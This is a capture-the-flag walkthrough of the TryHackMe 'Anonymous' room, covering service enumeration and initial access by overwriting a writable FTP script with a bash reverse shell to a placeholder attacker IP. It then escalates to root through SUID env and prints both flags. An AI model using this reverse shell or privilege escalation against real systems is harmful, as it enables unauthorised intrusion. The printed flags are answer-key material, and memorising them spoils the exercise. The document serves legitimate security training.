
# TryHackMe - Anonymous

## Overview

**Platform:** TryHackMe  
**Room:** Anonymous  
**Difficulty:** Medium  
**Category:** Linux Misconfiguration, Privilege Escalation  
**Focus:** Enumeration-driven exploitation and SUID abuse  

This lab demonstrates how **simple service misconfigurations**, when combined, can lead to full system compromise without the need for complex exploits or brute force attacks.

---

## Objectives

- Identify exposed services and misconfigurations
- Achieve initial access using legitimate service functionality
- Escalate privileges to root
- Capture both user and root flags
- Apply a **methodology-first approach**, avoiding unnecessary exploitation

---

## Initial Enumeration

### Network Scanning

```bash
nmap -sC -sV -T4 <target_ip>
```
**Key findings**:

- FTP (21) — **Anonymous login enabled**
- SMB (139, 445) — Guest access available
- SSH (22) — Present but not required

Although SMB enumeration was possible, it did not immediately provide a viable attack path.

### SMB Enumeration (False Path)
```bash
enum4linux <target_ip>
```
- Guest access confirmed
- Shared resources accessible
- No sensitive credentials or execution vectors discovered

**Takeaway**:
Not every exposed service is a viable entry point. Enumeration should inform decisions, not rush exploitation.

## FTP Enumeration (Primary Attack Vector)
Anonymous FTP Login
```bash
ftp <target_ip>
```
Anonymous access revealed a writable directory containing scripts:


```bash
/scripts
```
Files of interest:

- `clean.sh`
- `removed_files.log`
- `to_do.txt`

**Critical Finding**
A **writable script** (`clean.sh`) **executed by the system** is a direct path to Remote Code Execution.

## Initial Access — Reverse Shell via Script Injection
### Payload Preparation
The existing `clean.sh` script was overwritten with a reverse shell payload:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```
### Upload via FTP
```ftp
put clean.sh
```
### Listener on Attack Box
```bash
nc -lvnp 4444
```
Once the script executed, a shell was obtained successfully.

## Step 4 - Capturing the User Flag
With shell access established:

```bash
cat user.txt
```
### User Flag:
```bash
90d6f992585815ff991e68748c414740
```
## Privilege Escalation
### SUID Enumeration
```bash
find / -user root -perm -u=s 2>/dev/null
```
Interesting binary discovered:

```bash
/usr/bin/env
```
### Exploiting SUID env (GTFOBins)
According to GTFOBins, `env` with the SUID bit can spawn a privileged shell:

```bash
env /bin/sh -p
```
Verification:

```bash
whoami
```
Output:

```nginx
root
```
✔ Privilege escalation successful.

## Step 6 - Capturing the Root Flag
```bash
cd /root
cat root.txt
```
### Root Flag:

```bash
4d930091c31a622a7ed10f27999af363
```
## Key Takeaways
- Anonymous FTP access combined with writable scripts is extremely dangerous
- Enumeration should guide exploitation, not the other way around
- SMB access can be a false positive path
- SUID binaries must always be audited
- GTFOBins is essential for real-world privilege escalation
- Simple misconfigurations often lead to total compromise

## ⚠️ Disclaimer
This lab was completed in a controlled and legal environment provided by TryHackMe.
All actions were performed strictly for educational and training purposes.
